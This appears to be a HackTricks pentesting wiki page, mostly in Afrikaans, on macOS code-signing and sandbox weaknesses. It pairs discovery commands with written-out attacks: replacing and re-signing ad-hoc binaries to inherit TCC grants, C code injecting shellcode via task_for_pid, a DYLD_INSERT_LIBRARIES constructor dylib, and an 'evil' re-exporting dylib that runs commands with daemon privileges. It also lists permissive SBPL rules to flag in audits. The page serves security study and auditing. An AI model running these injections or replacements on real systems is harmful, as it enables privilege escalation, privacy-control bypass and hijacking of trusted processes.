# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Basiese Inligting

**Ad-hoc signing** (`CS_ADHOC`) skep 'n code signature met **geen certificate chain** — dit is 'n hash van die code sonder verifikasie van ontwikkelaaridentiteit. Die oorsprong van die binary kan nie aan enige ontwikkelaar of organisasie teruggespoor word nie.

Op Apple Silicon Macs vereis alle executables ten minste 'n ad-hoc signature. Dit beteken jy sal ad-hoc signatures op baie development tools, Homebrew packages, en derdeparty utilities vind.

### Waarom dit Saak Maak

- **Geen verifieerbare identiteit** — die binary kan vervang word sonder opsporing deur identity-based checks
- Third-party ad-hoc binaries in **privileged positions** (FDA, daemon, helpers) is hoë-prioriteit teikens
- Op sommige konfigurasies mag ad-hoc signatures **nie so streng geverifieer word** as developer-signed code
- Ad-hoc signed binaries wat **TCC grants** het, is besonder waardevol — die grants bly bestaan selfs al verander die binary-inhoud (hang af van hoe TCC die grant ge-key het)

### Ontdekking
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Aanval: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Ontfoutbare Prosesse (get-task-allow)

### Basiese Inligting

Die **`com.apple.security.get-task-allow`** entitlement (of `CS_GET_TASK_ALLOW` vlag) laat **enige proses toe om as 'n debugger aan te koppel**, geheue te lees, registers te wysig, kode in te spuit, en uitvoering te beheer.

Dit is bedoel **slegs vir ontwikkelingsboues**. Sommige derdeparty-binaries word egter met hierdie entitlement in produksie gelewer.

> [!CAUTION]
> 'n produksie-binary met `get-task-allow` is 'n **instant exploitation primitive**. Enige plaaslike proses kan `task_for_pid()` aanroep, die teiken se Mach task port kry, en arbitrêre kode inspuit wat hardloop met die teiken se entitlements, TCC grants, en sekuriteitskonteks.

### Ontdekking
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Attack: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Geen Biblioteekvalidasie + DYLD-omgewing

### Die Dodelike Kombinasie

Wanneer 'n binêre albei het:
- `com.apple.security.cs.disable-library-validation` (laai enige dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (aanvaar DYLD env vars)

Dit is 'n **gewaarborgde primitief vir kode-inspuiting** — `DYLD_INSERT_LIBRARIES` werk perfek.

### Ontdekking
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Aanval: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox Tydelike Uitsonderings

### Hoe hulle die Sandbox verswak

Sandbox tydelike uitsonderings (`com.apple.security.temporary-exception.*`) skep gate in die App Sandbox:

| Uitsondering | Wat Dit Toelaat |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Verbind met stelselwye XPC/Mach-dienste |
| `temporary-exception.files.absolute-path.read-write` | Lees/skryf lêers buite die app container |
| `temporary-exception.iokit-user-client-class` | Maak IOKit user-client-verbindinge oop |
| `temporary-exception.shared-preference.read-only` | Lees ander apps se voorkeure |
| `temporary-exception.files.home-relative-path.read-write` | Toegang tot paaie relatief tot `~` |

### Mach-Lookup Uitsonderings = Sandbox Escape Primitive

Die gevaarlikste uitsondering is **mach-lookup** — dit laat 'n sandboxed app toe om met bevoorregte daemons te praat:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Aanval: Sandbox Escape deur Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Privaat Apple-toestemmings

### Wat dit is

Entitlements met die voorvoegsel `com.apple.private.*` gee toegang tot **Apple-interne APIs** wat nie gedokumenteer of beskikbaar is vir derdeparty-ontwikkelaars nie. Derdeparty-binaries met private entitlements het dit bekom via enterprise cert, MDM, of nie-App-Store verspreiding.

### Gevaarlike Privaat Toestemmings

| Entitlement | Vermoë |
|---|---|
| `com.apple.private.tcc.manager` | Volledige TCC-databasis lees/skryf |
| `com.apple.private.tcc.allow` | Toegang tot spesifieke TCC-dienste |
| `com.apple.private.security.no-sandbox` | Voer uit sonder sandbox |
| `com.apple.private.iokit` | Direkte IOKit driver toegang |
| `com.apple.private.kernel.*` | Toegang tot kernel-koppelvlak |
| `com.apple.private.xpc.launchd.job-label` | Registreer/beheer launchd-take |
| `com.apple.rootless.install` | Skryf na SIP-beskermde paadjies |

### Ontdekking
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Aangepaste Sandbox Profiele (SBPL)

### Wat Dit Is

Binaries kan saamgestuur word met **aangepaste sandbox-profiele** geskryf in SBPL (Seatbelt Profile Language). Hierdie profiele kan meer beperkend OF **meer toegeeflik** wees as die standaard App Sandbox.

### Oudit van Aangepaste Profiele
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Skryfbare Biblioteekpaaie

### Wat dit is

Wanneer 'n binary 'n dynamic library vanaf 'n pad laai waaraan die huidige gebruiker kan **skryf**, kan die library met kwaadwillige kode vervang word.

### Ontdekking
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Aanval: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## Verwysings

* [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
* [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
* [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
* [The Evil Bit — clear-library-validation](https://theevilbit.github.io/posts/com.apple.private.security.clear-library.validation/)

{{#include ../../../banners/hacktricks-training.md}}
